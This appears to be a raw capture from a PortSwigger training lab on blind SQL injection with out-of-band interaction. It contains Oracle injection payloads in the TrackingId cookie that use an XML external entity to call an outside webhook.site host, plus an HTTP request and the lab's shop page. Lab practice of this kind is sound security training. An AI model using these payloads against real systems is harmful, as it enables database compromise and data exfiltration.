https://0a9b00db03ed7a5380b13fb500900083.web-security-academy.net/
rackingId=x'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://webhook.site/399ae2f3-a94a-4c94-8507-d2e2ed0f4c7a"> %remote;]>'),'/l') FROM dual)||''


GET / HTTP/2
Host: 0a9b00db03ed7a5380b13fb500900083.web-security-academy.net
Cookie: TrackingId=x'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://webhook.site/399ae2f3-a94a-4c94-8507-d2e2ed0f4c7a"> %remote;]>'),'/l') FROM dual)||''


GET / HTTP/2
Host: 0a9b00db03ed7a5380b13fb500900083.web-security-academy.net
Cookie: TrackingId=1YmIy9UlX3p6fwE7'+||(SELECT+extractvalue(xmltype('+%25remote%3b]>'),'/l')+FROM+dual)||'';session=7GaBKQzlHEVlsEJ8h9P553W9TZWMqkPx;
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i



HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11288

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Blind SQL injection with out-of-band interaction</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Blind SQL injection with out-of-band interaction</h2>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category selected" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating5.png">
                            $38.96
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating1.png">
                            $87.51
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating5.png">
                            $98.41
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating3.png">
                            $45.24
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating5.png">
                            $92.64
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $5.11
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating3.png">
                            $67.50
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating5.png">
                            $56.90
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/11.jpg">
                            <h3>Gym Suit</h3>
                            <img src="/resources/images/rating2.png">
                            $4.93
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/41.jpg">
                            <h3>The Trapster</h3>
                            <img src="/resources/images/rating2.png">
                            $14.15
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/44.jpg">
                            <h3>Paint a rainbow</h3>
                            <img src="/resources/images/rating5.png">
                            $87.54
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/67.jpg">
                            <h3>Your Virtual Journey Starts Here</h3>
                            <img src="/resources/images/rating4.png">
                            $77.16
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating4.png">
                            $2.12
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating1.png">
                            $12.85
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating5.png">
                            $20.27
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating4.png">
                            $86.67
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/68.jpg">
                            <h3>What Do You Meme?</h3>
                            <img src="/resources/images/rating3.png">
                            $62.46
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/32.jpg">
                            <h3>Adult Space Hopper</h3>
                            <img src="/resources/images/rating5.png">
                            $12.41
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/63.jpg">
                            <h3>Laser Tag</h3>
                            <img src="/resources/images/rating1.png">
                            $94.93
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/33.jpg">
                            <h3>AbZorba Ball</h3>
                            <img src="/resources/images/rating3.png">
                            $7.83
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>





